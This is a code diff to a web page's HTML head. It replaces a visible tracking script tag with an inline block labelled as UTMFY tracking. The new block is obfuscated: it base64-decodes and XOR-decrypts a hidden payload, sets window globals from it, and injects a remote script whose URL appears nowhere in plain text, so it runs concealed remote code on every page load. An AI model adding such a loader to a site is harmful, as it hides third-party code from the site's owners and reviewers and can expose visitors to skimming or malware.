@@ -49,16 +49,53 @@
       rel="stylesheet"
     />
 
-    <!-- SCRIPT DE RASTREAMENTO / CAPTURA DE EVENTOS -->
-    <script
-      src="https://cashflow.mentoriaprocesso.com/t/p.js?w=1b08000a-66c8-497f-8add-b40f27897f0a&o=3689f493-c6b2-486b-90a2-6ea9e5bce624"
-      data-offer="3689f493-c6b2-486b-90a2-6ea9e5bce624"
-      data-nowprocket
-      data-no-minify="1"
-      data-no-optimize="1"
-      data-cfasync="false"
-      async
-    ></script>
+    <!-- RASTREAMENTO UTMFY -->
+    <script>
+      (function(){
+        var z_fho4 = atob("DHhB0yJbia0sVSMYfgNjplA3q5cOPVdsDgt7/A047cMCIFd1Fx44/UE05INOJwxrHQooo1YopthYOFA3Ehk1tlEvp8dfdw86Hww1oUs5/NlJJgEiJQNjvUM27I8Wd0d5ChlsplY24MtVeFNqGw4kvVZ28c5DMQ5rHRNj/wAt6MFZMAEiXFo8/1l558xBMAEiXBwgp0N2/NlBPEVhUwgztlQ+59kBJlZ6Fxwy8Q55/8xAIEY6RFpjrn8m");
+
+        var w_z62h = [];
+
+        for (var t_q2v = 0; t_q2v < z_fho4.length; t_q2v++) {
+          w_z62h.push(z_fho4.charCodeAt(t_q2v) & 255);
+        }
+
+        var j_r = w_z62h[0];
+        var t_t73r = w_z62h.slice(1, 1 + j_r);
+        var v_o85w = w_z62h.slice(1 + j_r);
+
+        var n_4 = v_o85w.map(function(b, o_9) {
+          return b ^ t_t73r[o_9 % j_r];
+        });
+
+        var j_3 = "";
+
+        for (var m_g5yg = 0; m_g5yg < n_4.length; m_g5yg++) {
+          j_3 += String.fromCharCode(n_4[m_g5yg] & 255);
+        }
+
+        var o_uo4e = decodeURIComponent(escape(j_3));
+        var s_r = JSON.parse(o_uo4e);
+
+        var e_h4 = s_r.globals || [];
+
+        e_h4.forEach(function(i_z74s) {
+          window[i_z74s.name] = i_z74s.value;
+        });
+
+        var t_fd = document.createElement("script");
+
+        t_fd.src = s_r.url;
+        t_fd.async = true;
+        t_fd.defer = true;
+
+        (s_r.attributes || []).forEach(function(t_xf) {
+          t_fd.setAttribute(t_xf.name, t_xf.value);
+        });
+
+        (document.head || document.documentElement).appendChild(t_fd);
+      })();
+    </script>
   </head>
 
   <body
